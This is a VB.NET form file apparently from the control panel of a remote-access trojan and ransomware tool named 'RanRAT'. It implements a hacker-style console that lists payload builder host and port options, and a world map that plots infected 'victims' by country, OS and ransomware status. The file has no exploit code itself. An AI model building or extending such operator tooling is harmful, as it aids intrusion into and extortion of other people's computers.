Public Class MapGadget
    Private counter As Integer = 0
    Private taken As Boolean = False
    Private ref As Boolean = False
    Private oldh, oldw As Integer
    Friend ratcountry As String = "United Kingdom"
    Friend HackerIco As Integer = 1
    Friend country As String
    Friend serverx, servery As Single
    Friend ratcountryx, ratcountryy As Single
    Private closenow As Boolean = False
    Private Sub MapGadget_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        RichTextBox1.Text = "RanRAT@" & Environment.UserName & ": "
        RichTextBox1.ScrollToCaret()

    End Sub
    Private Sub RichTextBox1_KeyDown(sender As System.Object, e As System.Windows.Forms.KeyEventArgs) Handles RichTextBox1.KeyDown
        Dim command As String = ""
        If e.KeyCode = Keys.Down Or e.KeyCode = Keys.Left Or e.KeyCode = Keys.Right Then
            e.SuppressKeyPress = True

            counter += 1
            Try
                Dim lines As String() = RichTextBox1.Lines
                lines((RichTextBox1.Lines.Length) - 1) = ""
                RichTextBox1.Lines = lines
                RichTextBox1.AppendText("RanRAT@" & Environment.UserName & ": " & logger.Lines(counter))
                RichTextBox1.ScrollToCaret()
            Catch ex As Exception
                counter -= 1

                Try
                    Dim lines As String() = RichTextBox1.Lines
                    lines((RichTextBox1.Lines.Length) - 1) = ""
                    RichTextBox1.Lines = lines
                    RichTextBox1.AppendText("RanRAT@" & Environment.UserName & ": ")
                    RichTextBox1.ScrollToCaret()
                Catch exx As Exception
                    RichTextBox1.Text = "RanRAT@" & Environment.UserName & ": "
                    RichTextBox1.ScrollToCaret()
                End Try
            End Try


            '############# End Down

        End If


        If e.KeyCode = Keys.Up Then

            e.SuppressKeyPress = True

            counter -= 1

            Try
                Dim lines As String() = RichTextBox1.Lines
                lines((RichTextBox1.Lines.Length) - 1) = ""
                RichTextBox1.Lines = lines
                RichTextBox1.AppendText("RanRAT@" & Environment.UserName & ": " & logger.Lines(counter))
                RichTextBox1.ScrollToCaret()

            Catch ex As Exception
                counter += 1

                Try
                    Dim lines As String() = RichTextBox1.Lines
                    lines((RichTextBox1.Lines.Length) - 1) = ""
                    RichTextBox1.Lines = lines
                    RichTextBox1.AppendText("RanRAT@" & Environment.UserName & ": ")
                    RichTextBox1.ScrollToCaret()
                Catch exx As Exception
                    RichTextBox1.Text = "RanRAT@" & Environment.UserName & ": "
                    RichTextBox1.ScrollToCaret()
                End Try
            End Try

            '############# End Up


        End If
        If e.KeyCode = Keys.Enter Then
            e.SuppressKeyPress = True
            Dim last As String = RichTextBox1.Lines((RichTextBox1.Lines.Length) - 1)
            command = last.Replace("RanRAT@" & Environment.UserName & ": ", "")


            ConsoleCommandListener(command)
            command = ""

        End If

        If e.KeyCode = Keys.Back Or e.KeyCode = Keys.Delete Then
            Dim dl As String = Environment.UserName
            If (RichTextBox1.Text.Substring(RichTextBox1.Text.Length - (Environment.UserName.Length + 2))).Equals(dl & ": ") Then
                e.SuppressKeyPress = True
                HoldDele()
            Else
                Exit Sub
            End If
        End If

    End Sub
    Private Sub HoldDele()

        Dim lines As String() = RichTextBox1.Lines
        lines((RichTextBox1.Lines.Length) - 1) = ""
        RichTextBox1.Lines = lines
        RichTextBox1.AppendText("RanRAT@" & Environment.UserName & ": ")
        RichTextBox1.ScrollToCaret()
    End Sub
    Private Sub ConsoleCommandListener(ByVal command As String)
        On Error Resume Next
        RichTextBox1.AppendText(vbNewLine)
        logger.AppendText(command & vbNewLine)




        Select Case UCase(command)

            Case "?"
            Case "HELP"
                RichTextBox1.AppendText("-- help, Views commands list [Case / Spaces  are senstive" & vbNewLine)
                RichTextBox1.AppendText("-- exit-fs, Exit full screen hacker mode " & vbNewLine)
                RichTextBox1.AppendText("-- show options, Views payload options Host,Port,Name" & vbNewLine)
                RichTextBox1.AppendText("-- clear -c, Clears Console Text" & vbNewLine)
                RichTextBox1.AppendText("-- clear -m, Clears Console Commands Memory" & vbNewLine)
                RichTextBox1.AppendText("-- clear -l, Clears Client connection logs" & vbNewLine)
                RichTextBox1.AppendText("-- changeC, Opens GUI to change controller icon" & vbNewLine)
                RichTextBox1.AppendText("-- signout , Log the Current user out of the session , Back to login" & vbNewLine)
                RichTextBox1.AppendText("-- out , Log the Current user out of the session , Back to login [Clear user`s Entry]" & vbNewLine)

            Case UCase("show options")
                RichTextBox1.AppendText("Payload Host : " & Form1.getBuilderHost & vbNewLine)
                RichTextBox1.AppendText("Payload Port : " & Form1.getBuilderPort & vbNewLine)
                RichTextBox1.AppendText("Payload Name : " & Form1.getBuilderName & vbNewLine)
                RichTextBox1.AppendText("Listner Port : " & Form1.getServerPort & vbNewLine)


            Case UCase("clear")
                RichTextBox1.AppendText("-- clear -c , Clears Console Text" & vbNewLine)
                RichTextBox1.AppendText("-- clear -m , Clears Console Commands Memory" & vbNewLine)
                RichTextBox1.AppendText("-- clear -l , Clears Client connection logs" & vbNewLine)
                RichTextBox1.AppendText("-- help , Views commands list" & vbNewLine)
                RichTextBox1.AppendText("Type : help" & vbNewLine)
            Case UCase("changeC")
                Me.TopMost = False
                Flager.Stop()
                icochanger.Show()
            Case UCase("clear -c")
                RichTextBox1.Text = ""
                RichTextBox1.ScrollToCaret()
            Case UCase("clear -m")
                logger.Text = ""
            Case UCase("clear -l")
                ListBox1.Items.Clear()


            Case UCase("update -Access=False ")
            Case UCase("update -Access=True ")
            Case UCase("update ")
            Case UCase("update")
                Form1.getupdatex()

            Case UCase("exit-fs")
                Flager.Stop()
                closenow = True
                Me.Close()
                Form1.Focus()
                Form1.StartPosition = FormStartPosition.CenterScreen
                Form1.WindowState = FormWindowState.Normal
            Case UCase("signout")
                Me.Close()
                Form1.Close()
                Login.Show()
            Case UCase("out")
                Me.Close()
                Login.Show()
                Login.clout()
            Case Else
                RichTextBox1.AppendText("Command : '" & command & "' is not recognized as an internal command." & vbNewLine)
                RichTextBox1.AppendText("-- help , Views commands list" & vbNewLine)
                RichTextBox1.AppendText("Type : help" & vbNewLine)
        End Select
ReturnLine:

        RichTextBox1.AppendText(vbNewLine & "RanRAT@" & Environment.UserName & ": ")

        RichTextBox1.ScrollToCaret()
    End Sub
    Function getstartpoint(ByVal x, ByVal y) As Point
        Dim newpoint As New Point
        newpoint.X = x
        newpoint.Y = y
        Return newpoint

    End Function
    Function getendpoint(ByVal x, ByVal y) As Point
        Dim newpoint As New Point
        newpoint.X = x
        newpoint.Y = y
        Return newpoint
    End Function
    Public Sub DrawLineFloat(ByVal startpoint As Point, ByVal endpoint As Point)
        ' Create pen. 
        Dim blackPen As New Pen(Color.Lime, 3)
        ' Create coordinates of points that define line. 
        Dim x1 As Single = startpoint.X
        Dim y1 As Single = startpoint.Y
        Dim x2 As Single = endpoint.X
        Dim y2 As Single = endpoint.Y
        ' Draw line to screen. 

        Dim g As Graphics = PictureBox2.CreateGraphics()
        g.DrawLine(blackPen, x1, y1, x2, y2)

        blackPen.Dispose()

    End Sub
    Public Sub DrawLineFloatServer(ByVal startpoint As Point, ByVal endpoint As Point)
        ' Create pen.


        Dim blackPen As New Pen(Color.Yellow, 3)
        ' Create coordinates of points that define line. 
        Dim x1 As Single = startpoint.X
        Dim y1 As Single = startpoint.Y
        Dim x2 As Single = endpoint.X
        Dim y2 As Single = endpoint.Y
        ' Draw line to screen. 

        Dim g As Graphics = PictureBox2.CreateGraphics()
        g.DrawLine(blackPen, x1, y1, x2, y2)
        Dim myfont As New Font("Sans Serif", 12, FontStyle.Regular)
        g.DrawString("        Controller ", myfont, Brushes.Yellow, x2, y2)
        g.DrawString("        VCountry ", myfont, Brushes.Red, x1, y1)
        blackPen.Dispose()

    End Sub
    Sub MapPlotter(ByVal country As String, ByVal OS As String)
        cord_getter(country, OS)
    End Sub
    Friend startxpoint As Single
    Friend startypoint As Single
    Friend havepoints As Boolean
    Sub cord_getter(ByVal City As String, ByVal OS As String)
        On Error Resume Next
        Dim x As String = ""
        Dim database As New RichTextBox
        database.Text = My.Resources.countryinfo
        For Each line In database.Lines
            If line.Contains(City) Then
                x = line.Replace(City & "|", "")
                Dim coords() As String = x.Split(",")
                '      mapcoords(coords(0), coords(1))
                country = City
                pic2(coords(0), coords(1), OS)
            End If
        Next
    End Sub
    Dim OSIndex As Integer

    Private Function ReturnIndexLan(ByVal OS As String) As Integer
        If OS.Contains("xp") Or OS.Contains("XP") Or OS.Contains("Xp") Then
            Return 2
        ElseIf OS.Contains("7") Or OS.Contains("Seven") Or OS.Contains("even") Or OS.Contains("2008") Then
            Return 0
        ElseIf OS.Contains("ta") Or OS.Contains("Vista") Or OS.Contains("VISTA") Or OS.Contains("2007") Then
            Return 4
        ElseIf OS.Contains("10") Or OS.Contains("1") Or OS.Contains("8") Or OS.Contains("8.1") Or OS.Contains("2012") Or OS.Contains("2010") Then
            Return 1
        ElseIf OS.Contains("2000") Or OS.Contains("2003") Or OS.Contains("2002") Or OS.Contains("2001") Then
            Return 2
        Else
            Return 3
        End If
    End Function
    Private Function ReturnIndexLan_ran(ByVal OS As String) As Integer
        If OS.Contains("xp") Or OS.Contains("XP") Or OS.Contains("Xp") Then
            Return 10
        ElseIf OS.Contains("7") Or OS.Contains("Seven") Or OS.Contains("even") Or OS.Contains("2007") Or OS.Contains("2008") Then
            Return 8
        ElseIf OS.Contains("ta") Or OS.Contains("Vista") Or OS.Contains("VISTA") Then
            Return 7
        ElseIf OS.Contains("10") Or OS.Contains("1") Or OS.Contains("8") Or OS.Contains("8.1") Or OS.Contains("2012") Or OS.Contains("2010") Then
            Return 9
        ElseIf OS.Contains("2000") Or OS.Contains("2003") Or OS.Contains("2002") Or OS.Contains("2001") Then
            Return 10
        Else
            Return 6
        End If
    End Function
    Sub pic2(ByVal latitude As Double, ByVal longitude As Double, ByVal OS As String)

        Dim pbwidth As Double = PictureBox2.Width
        Dim pbheight As Double = PictureBox2.Height
        Dim longratio As Double = pbwidth / 360
        Dim latratio As Double = pbheight / 180
        Dim latcord As Double = 90 - latitude
        Dim longcord As Double = (180 + longitude)
        latcord = latratio * latcord
        longcord = longratio * longcord
        Dim g As Graphics = PictureBox2.CreateGraphics
        If havepoints = False Then
            startxpoint = CInt(longcord) - 1
            startypoint = CInt(latcord) - 1
            ratcountryx = CInt(longcord) - 1
            ratcountryy = CInt(latcord) - 1
            havepoints = True
        ElseIf havepoints = True Then
            If startxpoint <> Nothing And startypoint <> Nothing Then
                DrawLineFloat(getstartpoint(startxpoint, startypoint), getendpoint(CInt(longcord) - 1, CInt(latcord) - 1))

            End If
        End If
        Dim flag As Image = ImageList1.Images(GetCountryNumber(UCase(country)))
        Dim OSImage As Image '= ImageList2.Images(ReturnIndexLan(OS))
        Try
            If OS.Contains("yesran") Then
                OSImage = ImageList2.Images(ReturnIndexLan_ran(OS))
            ElseIf OS.Contains("noran") Then
                OSImage = ImageList2.Images(ReturnIndexLan(OS))
            Else
                OSImage = ImageList2.Images(ReturnIndexLan(OS))
            End If
        Catch ex As Exception
            OSImage = ImageList2.Images(ReturnIndexLan(OS))
        End Try



        DrawLineFloat(getstartpoint(CInt((longcord - OSImage.Width / 2) - 20), CInt((latcord - OSImage.Height / 2)) + 80), getendpoint(CInt(longcord - flag.Width / 2), CInt(latcord - flag.Height / 2)))

        g.DrawImage(OSImage, CInt((longcord - OSImage.Width / 2) - 20), CInt((latcord - OSImage.Height / 2) + 80), 50, 45)


        g.DrawImage(flag, CInt(longcord - flag.Width / 2), CInt(latcord - flag.Height / 2), 18, 16)


    End Sub


    Sub hackercoord(ByVal City As String, ByVal OS As String)
        On Error Resume Next
        Dim x As String = ""
        Dim database As New RichTextBox
        database.Text = My.Resources.countryinfo
        For Each line In database.Lines
            If line.Contains(City) Then
                x = line.Replace(City & "|", "")
                Dim coords() As String = x.Split(",")
                '      mapcoords(coords(0), coords(1))
                country = City
                pic2(coords(0), coords(1), OS)
                hackerpic(coords(0), coords(1))
            End If
        Next
    End Sub

    Sub hackerpic(ByVal latitude As Double, ByVal longitude As Double)
        Dim pbwidth As Double = PictureBox2.Width
        Dim pbheight As Double = PictureBox2.Height
        Dim longratio As Double = pbwidth / 360
        Dim latratio As Double = pbheight / 180
        Dim latcord As Double = 90 - latitude
        Dim longcord As Double = (180 + longitude)
        latcord = latratio * latcord
        longcord = longratio * longcord
        Dim g As Graphics = PictureBox2.CreateGraphics
        Dim flag As Image
        Select Case HackerIco
            Case 1
                flag = My.Resources.shell1.ToBitmap
                serverx = CInt(longcord - flag.Width / 7) - 30
                servery = CInt(latcord - flag.Height / 7) - 70
                g.DrawImage(flag, CInt(longcord - flag.Width / 2) - 30, CInt(latcord - flag.Height / 2) - 70, 35, 35)
                Exit Select
            Case 2
                flag = My.Resources.shell2.ToBitmap
                serverx = CInt(longcord - flag.Width / 7) - 30
                servery = CInt(latcord - flag.Height / 7) - 70
                g.DrawImage(flag, CInt(longcord - flag.Width / 2) - 30, CInt(latcord - flag.Height / 2) - 70, 35, 35)
                Exit Select
            Case 3
                flag = My.Resources.shell3.ToBitmap
                serverx = CInt(longcord - flag.Width / 7) - 30
                servery = CInt(latcord - flag.Height / 7) - 70
                g.DrawImage(flag, CInt(longcord - flag.Width / 2) - 30, CInt(latcord - flag.Height / 2) - 70, 35, 35)
                Exit Select
            Case 4
                flag = My.Resources.shell4.ToBitmap
                serverx = CInt(longcord - flag.Width / 7) - 30
                servery = CInt(latcord - flag.Height / 7) - 70
                g.DrawImage(flag, CInt(longcord - flag.Width / 2) - 30, CInt(latcord - flag.Height / 2) - 70, 35, 35)
                Exit Select
            Case 5
                flag = My.Resources.shell5.ToBitmap
                serverx = CInt(longcord - flag.Width / 7) - 30
                servery = CInt(latcord - flag.Height / 7) - 70
                g.DrawImage(flag, CInt(longcord - flag.Width / 2) - 30, CInt(latcord - flag.Height / 2) - 70, 35, 35)
                Exit Select
            Case 6
                flag = My.Resources.shell6.ToBitmap
                serverx = CInt(longcord - flag.Width / 7) - 30
                servery = CInt(latcord - flag.Height / 7) - 70
                g.DrawImage(flag, CInt(longcord - flag.Width / 2) - 30, CInt(latcord - flag.Height / 2) - 70, 35, 35)
                Exit Select
            Case 7
                flag = My.Resources.shell7.ToBitmap
                serverx = CInt(longcord - flag.Width / 7) - 30
                servery = CInt(latcord - flag.Height / 7) - 70
                g.DrawImage(flag, CInt(longcord - flag.Width / 2) - 30, CInt(latcord - flag.Height / 2) - 70, 35, 35)
                Exit Select
        End Select


    End Sub

    Private Sub PictureBox2_Paint(sender As Object, e As PaintEventArgs) Handles PictureBox2.Paint
        Flager.Start()
        '  Dim TXT As New System.Threading.Thread(AddressOf Flager_Ticking)
        '  TXT.Start()
    End Sub

    Dim refreshed As Boolean

    Private Sub PictureBox2_Resize(sender As Object, e As EventArgs) Handles PictureBox2.Resize
        resizeEvent()
    End Sub
    Private Sub resizeEvent()
        If (Me.Height = oldh) = False Then
            PictureBox2.Refresh()
            taken = False
        End If
        If (Me.Width = oldw) = False Then
            PictureBox2.Refresh()
            taken = False
        End If
    End Sub
    Private refc As Integer = 0
    Private Sub Flager_Tick(sender As System.Object, e As System.EventArgs) Handles Flager.Tick
        Flager_Ticking()
    End Sub
    Private Sub Flager_Ticking()

        If refc = 20 Then
            ref = False
            refc = 0
        End If
        If ref = False Then
            PictureBox2.Refresh()
            ref = True
        End If
        If taken = False Then
            oldh = Me.Height
            oldw = Me.Width
            PictureBox2.Refresh()
            taken = True
        End If
        refresh_c()
        refc += 1

    End Sub
    Private Sub refresh_c()
        On Error Resume Next
        Me.ListBox1.Items.Clear()
        DrawLineFloatServer(getstartpoint(ratcountryx, ratcountryy), getendpoint(serverx, servery))
        hackercoord(ratcountry, My.Computer.Info.OSFullName)
        If refreshed = True Then
        End If
        If Form1.l1.Items.Count > 0 Then
            For Each victim As ListViewItem In Form1.l1.Items
                'l.SubItems.Add(a(2)) ' pc name
                'l.SubItems.Add(a(3)) ' OS
                'l.SubItems.Add(a(4)) ' country
                'l.SubItems.Add(a(6)) 'Ransomware
                Dim city As String = victim.SubItems(4).Text
                Dim OS As String = victim.SubItems(3).Text
                If victim.SubItems(5).Text.Equals("Yes") Then
                    OS &= "yesran"
                ElseIf victim.SubItems(5).Text.Equals("No") Then
                    OS &= "noran"
                End If

                MapPlotter(city, OS)
            Next
        End If
        For Each item In Form1.ListBox1.Items
            Me.ListBox1.Items.Add(item)
        Next
        MapPlotter(ratcountry, My.Computer.Info.OSFullName)
    End Sub

    Private Sub MapGadget_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing

        If closenow = True Then
            e.Cancel = False
            Return
        ElseIf closenow = False Then
            If e.CloseReason = CloseReason.ApplicationExitCall Or e.CloseReason = CloseReason.UserClosing Or e.CloseReason = CloseReason.FormOwnerClosing Or e.CloseReason = CloseReason.None Or e.CloseReason = CloseReason.TaskManagerClosing Then
                MsgBox("Failure " & vbNewLine & "Ending Thread is not allowed." & vbNewLine & " [AccessDenied]" & vbNewLine & "Use command : exit-fs", MsgBoxStyle.Critical)
                e.Cancel = True

            End If
            MsgBox("Failure " & vbNewLine & "Ending Thread is not allowed." & vbNewLine & " [AccessDenied]" & vbNewLine & "Use command : exit-fs", MsgBoxStyle.Critical)
            e.Cancel = True
        End If
    End Sub
End Class